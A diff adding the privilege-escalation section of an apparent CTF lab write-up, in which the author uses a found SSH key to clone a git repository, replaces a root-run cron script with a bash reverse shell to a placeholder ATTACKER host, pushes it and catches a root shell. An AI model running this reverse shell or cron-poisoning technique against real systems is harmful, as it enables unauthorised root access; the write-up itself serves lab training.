@@ -163,6 +163,47 @@ Got some creds, the description for user ademola is admin, let's try ssh using t
 
 Great we got ssh using those creds, let's escalate privs 
 
+![image](https://user-images.githubusercontent.com/87468669/211139654-43afe0ba-8685-4c5c-acac-44b6fb297eaa.png)
 
+Found id_rsa key for user git, let's try ssh using the id_rsa key.
 
+![image](https://user-images.githubusercontent.com/87468669/211139747-fab1d9dd-4cf9-4c41-923f-581cca7bda36.png)
+
+worked, but we are in a git restricted shell. i tried to escape the shell, did not work. let's enumerate harder.🤔
+
+![image](https://user-images.githubusercontent.com/87468669/211139835-6a687b3e-5aa1-4d75-ab1e-98c845bd378d.png)
+
+Back to the ssh of use dademola, i saw a crontab.bak and it say user root runs backups.sh very 3 mins. Since we have ssh-keys, we can clone the repo /git-server.
+
+```
+GIT_SSH_COMMAND='ssh -i id_rsa -p 43022' git clone git@HUNIT-ADDRESS:/git-server
+```
+
+![image](https://user-images.githubusercontent.com/87468669/211140051-e78b1951-24b3-48e2-93e7-a890fc0e80c2.png)
+
+From here we can cd to `/git-server` directory we've download. next is to poision the `backups.sh` file.
+
+```
+echo "/bin/bash -i >& /dev/tcp/ATTACKER/8080 0>&1" > backups.sh
+
+chmod +x backups.sh
+```
+
+![image](https://user-images.githubusercontent.com/87468669/211140200-ab60c10a-68c2-4f49-93ed-d9f6952f6725.png)
+
+Now we've posioned it with our malicious code, add the file to commits, add a commit message and push: 
+
+```
+git add . 
+git commit -m "should work..."
+GIT_SSH_COMMAND='ssh -i ./id_rsa -p 43022' git push
+```
+
+![image](https://user-images.githubusercontent.com/87468669/211140284-89582520-e006-4ce7-a34c-f9e0b1e02472.png)
+
+After we push the commit, fire up nc listener and wait... we should catch a reverse shell.
+
+![image](https://user-images.githubusercontent.com/87468669/211140777-9b7dbdd8-dbb3-43ed-a2f2-16338c714717.png)
+
+And Boom!!! we got root🤓😎.
 
